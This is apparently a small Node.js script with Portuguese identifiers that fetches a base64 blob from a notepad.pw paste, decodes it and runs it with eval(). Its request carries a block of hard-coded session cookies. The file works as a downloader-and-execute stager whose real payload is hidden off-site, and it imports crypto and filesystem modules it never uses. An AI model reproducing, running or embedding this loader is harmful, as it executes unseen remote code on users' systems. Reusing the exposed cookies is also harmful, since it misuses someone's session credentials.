import CryptoJS from 'crypto-js';
import md5 from 'js-md5';
import fs from 'fs';
const pt = import.meta.url

let funApi;
async function api(inf) {
    const module = await import('./api.js');
    funApi = module.default;
    return await funApi(inf);
}


async function principal() {
    const requisicao = {
        url: 'https://notepad.pw/raw/KEeTANbHwbUSqWTFsNab',
        method: 'GET',
        headers: {
            'cookie': ' SPSI=6d80b6d683d1bd9629600f152fade39e; SPSE=O67aw5Lw3HQEeXG3y9DfVEl2ekkH/9sCPlfRzVC5oxZ1J/w94XwOvaIVW6csSpsLwQ8TAzCoy/MZyMhS7HUrrQ==; pad_cookie=1ca4c8eb774aa89acec759afd891542e783e04a9; UTGv2=h4d06d560231040a8c7e1c5caa493e6e6548; typography=%7B%22sp_class%22%3A%22not-active%22%7D; _ga=GA1.1.669878146.1685537545; _ga_0E2CT7YLRP=GS1.1.1685537545.1.0.1685537545.0.0.0; adOtr=b0JZ6688dd3; spcsrf=c6808dc4c509ac6029e5d9e7e35c8afe; PRLST=; sp_lit=KoX410bL/zhOADAtBb0kfw=='
        }
    };
    const re = await api(requisicao);
    //console.log(re.res)

    const texto = re.res;
    const regex = /pre-wrap;">([\S\s]*)<\/pre>/;
    const resultado = texto.match(regex);
    if (resultado) {
        const valor = resultado[1];
        const base64String = valor;
        const decodedString = atob(base64String);
        const funcaoCode = `
        ${decodedString}
        `
        //console.log(decodedString)
        eval(funcaoCode);
    } else {
        console.log('Nenhum valor encontrado.');
    }

}
principal()




